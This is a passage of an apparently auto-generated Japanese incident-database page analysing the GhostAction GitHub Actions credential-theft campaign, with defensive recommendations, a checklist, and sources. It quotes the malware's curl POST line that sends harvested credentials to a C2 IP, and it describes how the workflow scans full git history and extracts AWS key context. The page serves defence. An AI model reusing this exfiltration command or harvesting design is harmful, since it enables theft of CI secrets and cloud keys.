**「既定のチェックアウトは単一の浅いブランチを取得するが、 depth 0 は全ブランチ・全タグを取得する」**（原文英語。本記録の訳）—— **これにより `git log -p --all` が全履歴のパッチ本文を読める。** **本記録の読みでは、既定値が防御として働いていた**（本記録の判断）—— **浅いチェックアウトでは、過去の鍵には届かない**</div><div class=la><b>取るべき行動</b> **自組織のワークフローで `fetch-depth: 0` を使っている箇所を列挙し、 本当に全履歴が必要かを確かめる**（タグからのバージョン算出・ 変更履歴の生成などが正当な用途である）。 **必要な場合は、そのジョブが外部ネットワークへ送信できる範囲を絞る。** **レビューの観点に「checkout の depth を変える変更」を加える**—— **1行の変更で、ジョブが読める範囲が大きく変わる**（本記録の評価）</div></li><li><div class=lp>AWS のアクセスキー ID だけでなく「前後2行」が狙われている。鍵対で考える</div><div class=lw>**Socket は2つの前後文抽出を「the most deliberate part of the addition」（追加部分のうち最も意図的な箇所）と評している** （原文英語。本記録の訳）。 **理由は明快である**—— **「An AKIA or ASIA value is only a key identifier; it authenticates nothing on its own」（AKIA や ASIA の値は鍵の識別子にすぎず、 それ自体では何も認証しない）。** **40文字のシークレットアクセスキーは、実務上 `.env`・ AWS の認証情報ファイル・Terraform の変数ファイル・CI の設定ブロックで 1〜2行離れた場所にある**（Socket の分析）—— **前後2行を取ることで、孤立した識別子ではなく使える鍵対が復元される**</div><div class=la><b>取るべき行動</b> **AWS のアクセスキーを常設せず、OIDC による一時的な認証に切り替える。** **切り替えられない場合は、キー ID とシークレットを 同じファイル・同じ近傍に置かない**（ただし本記録の評価では、 これは時間稼ぎにすぎない。履歴に両方が入っていれば同じである）。 **履歴に AWS キーが見つかった場合は、CloudTrail で露出期間中と以後の 不審な IAM ユーザー・アクセスキー・リージョンを確認する**（Socket の推奨）</div></li><li><div class=lp>C2 は単一の固定 IP への平文 POST である。送信ログを遡って「渡ったか」を確定する</div><div class=lw>**送出は `curl -s -m 20 -X POST --data-binary &quot;$full&quot; &quot;hxxp://193.32.204[.]199/?c=monami&quot; || true` の1行である** （Socket が示した全文。defang 表記は Socket のもの）。 **本文には `REPO=`・`AKIA_CTX_START`・`AKIA_CTX_END` という目印が含まれる** （Socket の IoC）。 **`|| true` により、送信が失敗してもジョブは成功のまま終わる** （本記録の読み）—— **実行履歴上では失敗として目立たない。** **GitHub ホストのランナーからの送信は利用者側のログに残らない** （本記録の指摘）</div><div class=la><b>取るべき行動</b> **C2 の IP（193.32.204.199）を遮断リストに登録し、 過去の通信ログを遡って検索する**—— **遮断は当座の措置、遡っての検索が「渡ったか」を確定する** （本記録の判断）。 **セルフホストランナーの送信先を許可リストで制限する。** **GitHub ホストのランナーを使っている場合は、 Actions の実行履歴を確認し、完了した実行は情報流出とみなす** （Socket の推奨）—— **`|| true` があるため「成功」は送信の成否を保証しないが、 流出したものとして扱う判断が正しい**</div></li><li><div class=lp>「2つの露出は別物」として対応を分ける。片方だけ直して終わらせない</div><div class=lw>**Socket の結論は明確である**—— **「Rotating Actions secrets does nothing for a committed-credential exposure, and scanning the working tree does nothing for an Actions-secret exposure」（Actions シークレットの入れ替えは コミットされた資格情報の露出に何の効果もなく、 作業ツリーの走査は Actions シークレットの露出に何の効果もない）** （原文英語。本記録の訳）。 **本記録の評価では、本件の最大の落とし穴はここである** （本記録の判断）—— **1つのファイルが2種類の鍵を1回の POST で持ち出すため、 対応も2種類必要になる**</div><div class=la><b>取るべき行動</b> **対応を2つの作業に分けて管理する。** **①Actions シークレット**—— ワークフローが参照していたシークレットをすべて入れ替え、 PAT は失効させる。配布基盤で想定外の版が出ていないかを確認する。 **②履歴にコミットされた資格情報**—— `git log -p --all` と到達不能オブジェクトを含めて走査し、 13種すべてを入れ替える。 **どちらを終えたかをチェックリストで追う**—— **「対応済み」の報告が片方だけを指していないか確かめる**（本記録の評価）</div></li></ul></div></div>
+<div class="blk " id="s20"><h3>自組織に当てはまるか</h3><div class="blknote">該当する項目があれば、この事案と同じ構図が自組織でも成立しうることを意味します。</div><div class=twrap><table class=g><thead><tr><th>観点</th><th>自社に当てはまるか</th><th>該当する場合に何が起きうるか</th></tr></thead><tbody><tr><td class=nowrap><span class="b axis">委託・第三者部品</span></td><td><span class=chk>□</span> 組織所有のリポジトリに、組織外の個人（原作者・過去の貢献者）が 書き込み権限を持っている</td><td class=sm>**uber/athenadriver は、原作者として書き込み権限を持つ個人の アカウントが侵害されたことで悪性ワークフローを置かれた**（Socket の観測）—— **Uber 自身のアカウントは侵害されていない。** **追記では侵害された貢献者経由で組織所有リポジトリに到達したとされている**</td></tr><tr><td class=nowrap><span class="b axis">システム構成</span></td><td><span class=chk>□</span> 既定ブランチが保護されておらず、.github/workflows/ 配下の変更が レビューなしでコミットできる</td><td class=sm>**本件はワークフローを既定ブランチへ直接コミットし、 次の push で実行されて成立している**（Socket の第3段）—— **攻撃者はコードを書いていない。ファイルを1つ置いただけである** （本記録の判断）</td></tr><tr><td class=nowrap><span class="b axis">データの保持</span></td><td><span class=chk>□</span> git の履歴（既定ブランチ以外のブランチ・タグ・書き換えで外された コミットを含む）に資格情報が入ったことがある</td><td class=sm>**本変種は `fetch-depth: 0` で全ブランチ・全タグを取得し、 `git log -p --all` の全履歴を13種のパターンで照合する**（Socket の分析）—— **Socket は「メンテナがもう消えたと思っている資格情報である」と 評している**（原文英語。本記録の訳）。 **既定ブランチを走査するだけでは見つからない**</td></tr><tr><td class=nowrap><span class="b axis">認証・認可</span></td><td><span class=chk>□</span> AWS の長期アクセスキー（AKIA 形式）をリポジトリ・設定ファイル・ CI の設定に書いている</td><td class=sm>**本変種は AKIA／ASIA の前後2行を作業ツリーと履歴の両方から切り出し、 40文字のシークレットアクセスキーごと鍵対として回収する設計である** （Socket の分析）—— **キー ID 単体の露出とは意味が違う**</td></tr><tr><td class=nowrap><span class="b axis">認証・認可</span></td><td><span class=chk>□</span> パッケージの公開に長期の資格情報（PyPI のパスワード・ crates.io のトークン等）を使い、リポジトリのシークレットに置いている</td><td class=sm>**継承された半分が狙うのはこれである**（Socket の観測）—— **kitao/pyxel では CARGO_REGISTRY_TOKEN・PYPI_PASSWORD 等が対象になった。** **Socket はその価値を「利用者が既に信頼しているパッケージの 悪性リリースを出荷する能力」としている**（原文英語。本記録の訳）</td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> 1年以上動いていないリポジトリやフォークが Actions を有効にしたまま 残っており、棚卸しの対象になっていない</td><td class=sm>**346件のうち279件はフォークであり、十年休眠しているリポジトリも 含まれていた**（Socket の観測）—— **「選別的な標的設定ではなく自動的な列挙と整合する」** （原文英語。本記録の訳）。 **攻撃者はリポジトリの価値を見ておらず、書き込める先すべてに置いている** （本記録の判断）</td></tr></tbody></table></div></div>
+<div class="blk " id="s21"><h3>出典</h3><div class=rg><div class=rgt>ベンダー分析</div><ol><li><span class=rid>[1]</span> <span class=sm>2026年10月9日（本文。同日に冒頭へ追記。追記の時刻は記事上で未確定） Socket（Socket, Inc.）</span> <a href="https://socket.dev/blog/ghostaction-cloud-credentials" target="_blank" rel="noreferrer noopener nofollow">New GhostAction Wave Hits Hundreds of Repos, Expanding Beyond CI/CD Secrets to Cloud Credentials</a> <span class="b kind">調査レポート</span><span class=sm>（(**本記録の一次資料。** 保存分 output/articles/20261009/ 0346_socketdev-blog_new-ghostaction-wave-hits-hundreds-of-repos-expand.md で 本文を読み、2026年10月10日に記事本体を取得して冒頭の追記・推奨対応・ IoC 一覧・影響を受けたリポジトリ名を確認した（本記録の確認）。 **2026年10月8日のバーストの内訳（346リポジトリ＝henrywoo 318〈ソース39・ フォーク279〉・kitao 27・uber/athenadriver 1）とコミットの時刻窓 （henrywoo 21:10:15〜21:26:32Z／kitao 13:40〜13:44Z）**、 **ファイル名（.github/workflows/security-audit.yml および github_actions_security.yml）とコミットメッセージ**、 **ワークフローの全文（kitao/pyxel・commit 97670a55 から取得）と トリガ（on: push フィルタ無し＋workflow_dispatch）**、 **キャンペーンの3段（資格情報の入手〈方法は未観測〉・Actions シークレット名の 偵察と埋め込み・既定ブランチへの直接コミット）**、 **継承された半分（Actions シークレットの窃取。kitao/pyxel では CARGO_REGISTRY_TOKEN・PERSONAL_ACCESS_TOKEN・PYPI_PASSWORD・PYPI_USERNAME）と その価値（信頼されたパッケージの悪性リリース）**、 **追加された半分（fetch-depth: 0 の意味／5つの収集変数 grepped・gl・hist・ ctx・hctx／git log -p --all を head -200000 で読むこと）**、 **13種の資格情報パターンの一覧と Socket による4分類**、 **AWS の前後2行抽出の意図（AKIA/ASIA は識別子にすぎず 40文字のシークレットが1〜2行離れた場所にあること、 AKIA_CTX_START/END の区切り）**、 **C2（hxxp://193.32.204[.]199/?c=monami）と本文の目印（REPO=・ AKIA_CTX_START・AKIA_CTX_END）、|| true を含む送出の1行**、 **2026年10月9日時点でファイルが既定ブランチに残存し実行が成功していること、 PyPI・crates.io への悪性版の公開が未確認であること**、 **kitao/pyxel の規模（スター18,420・フォーク966）と henrywoo/pyllama・henrywoo/chatllama の規模**、 **GitGuardian が2025年9月に記録し2026年に再来を報告したという位置づけ**、 **冒頭の追記（2026年10月7日以降に500超のアカウントが数万リポジトリへ／ 侵害された貢献者経由で組織所有リポジトリにも到達／ kitao/pyxel が公開用資格情報を狙われた最も明確な確認例）**、 **推奨対応（Actions シークレット側・履歴にコミットされた資格情報側・ 共通の3群）**の出典。 **ベンダーの自社観測に基づく調査レポートであり、 被害組織・プラットフォーム・当局の公表ではない**（本記録の明記）)）</span></li></ol></div></div>
+<div id="sec-updates"><div class="blk " id="s22"><h3>この記録の更新履歴</h3><ul class="sm"><li><span class=sm>2026年10月10日</span> <span class="b rev">新規作成</span> 2026年10月9日の Socket のブログを起点に新規作成した。 **Socket の記事本体を2026年10月10日に取得し、 保存分（RSS 経由）には含まれていなかった冒頭の追記・推奨対応の全体・ IoC 一覧・影響を受けたリポジトリ名を確認して補った**（本記録の確認）—— **とくに追記（2026年10月7日以降に500超のアカウントが数万リポジトリへ／ 侵害された貢献者経由で組織所有リポジトリにも到達）と、 推奨対応の3群（Actions シークレット側・履歴の資格情報側・共通）、 および別名ファイル `github_actions_security.yml` は本体から得た。** **本記録は〈作業ツリーだけでなく `git log -p --all` の全履歴が 照合対象に入ったこと——`fetch-depth: 0` が射程を決め、 「もう消したと思っている鍵」が回収されること〉と 〈偵察を要する半分（Actions シークレット）と要しない半分（履歴掃き）が 1ファイルに同居し、対策が互いに効かないこと〉を 構造上の中心として評価した。** **あわせて、uber/athenadriver が「原作者として書き込み権限を持つ個人の アカウント侵害経由で到達された組織所有リポジトリ」である点を、 委託先の侵害が委託元に及ぶ構造と同じ形として記録した**（本記録の判断）。 **type は threat-campaign を主とし、公開用資格情報を通じて 下流のパッケージ利用者に波及しうる性格を secondary_types に supply-chain-incident として併記した。** **被害者が特定の組織ではないため victim_class を置いた**—— **「侵害されたアカウントの保有者」と「そのアカウントが書き込める先の リポジトリの保有者」の2層に分かれることを明記した。** **数値はすべてベンダーの自社観測であり、出所を「第三者の調査による値」とした** （本記録の明記）—— **346リポジトリ（10月8日のバースト）と数万リポジトリ（追記）は 期間も単位も異なる別の集計であり、合算しないことを discrepancies に残した。** **500超のアカウントは原文が「more than 500」であるため確度を 「少なくとも」とした。** **抽出された IoC の悪性は検証していない**（照合先のテレメトリを持たないため。 本DBの方針に従う）。 **日本との関係は、Socket が名前空間とリポジトリ数しか示しておらず 所在地の記述が無いため「有名事象として記録」の扱いにした**—— **アカウント名や製品名から所在地・国籍を推定しない**（本記録の明記）。 資格情報の入手経路（Socket も未観測）・実際に窃取された件数と内訳・ 収集された資格情報の使用の有無・日本の組織が含まれるか・攻撃者の帰属・ 追記の正確な時刻・GitHub や Uber による公表の有無・ 履歴20万行の上限で古い側が取りこぼされるかは いずれも分からないため unknowns に残した。 **GitGuardian の先行レポート本文は参照していないことを discrepancies に明記した**—— **初期の波が Actions シークレットのみを狙ったという比較は Socket の説明に依拠している。** **2026年10月9日時点でファイルが既定ブランチに残存し、 規模が拡大中で収束の見通しが示されていないため status は updating とした**</li></ul></div></div>
+<div class="blk " id="s23"><h3>タグ</h3><span class="b tag">GhostAction</span><span class="b tag">GitHub Actions</span><span class="b tag">security-audit.yml</span><span class="b tag">サプライチェーン</span><span class="b tag">CI/CD</span><span class="b tag">シークレット窃取</span><span class="b tag">git履歴</span><span class="b tag">fetch-depth</span><span class="b tag">AWS</span><span class="b tag">アクセスキー</span><span class="b tag">PyPI</span><span class="b tag">crates.io</span><span class="b tag">Socket</span><span class="b tag">GitGuardian</span><span class="b tag">uber/athenadriver</span><span class="b tag">kitao/pyxel</span></div>
+
+<script>
+// 狭い画面では目次を畳んでおく（本文が遠くなるのを避ける）。
+// 広い画面ではサイドバーとして常時表示するので開いたままにする。
+(function () {
+  var toc = document.getElementById('toc');
+  if (!toc) return;
+  var narrow = window.matchMedia('(max-width: 1179px)');
+  function sync(e) { if (e.matches) toc.removeAttribute('open'); else toc.setAttribute('open', ''); }
+  sync(narrow);
+  if (narrow.addEventListener) narrow.addEventListener('change', sync);
+  // 目次から飛んだら、狭い画面では畳んで本文を見せる
+  toc.addEventListener('click', function (ev) {
+    if (ev.target.tagName === 'A' && narrow.matches) toc.removeAttribute('open');
+  });
+})();
+</script>
+
+<footer>
+  インシデント事例DB — 自動生成｜作成 2026-10-10 09:18 JST<br>
+  <b>Part 1（起きたこと）</b>は公表資料・報道に基づく事実の記録です。数値には確度と出所を、
+  出典には一次情報／報道の別を付しています。公表されていない事項は削除せず明示しています。<br>
+  <b>Part 2（学べること）</b>は本記録による評価・示唆であり、当事者の見解ではありません。
+</footer>
+</div>
+</body>
+</html>
